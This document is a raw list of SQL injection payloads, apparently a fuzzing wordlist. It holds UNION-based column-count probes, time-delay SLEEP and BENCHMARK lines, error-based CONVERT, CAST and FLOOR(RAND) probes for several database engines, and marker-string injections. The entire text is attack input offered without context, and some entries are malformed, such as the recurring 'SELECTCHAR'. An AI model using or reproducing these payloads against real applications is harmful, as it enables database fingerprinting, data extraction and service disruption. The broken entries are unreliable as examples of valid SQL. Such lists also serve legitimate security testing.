+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
+ UNION ALL SELECT USER()-- 
+ UNION ALL SELECT SLEEP(5)-- 
+ UNION ALL SELECT USER(),SLEEP(5)-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;))-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT NULL-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- 
+ UNION ALL SELECT NULL#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#
+ UNION ALL SELECT NULL 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
+ AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
+ AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)
+ AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+ UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
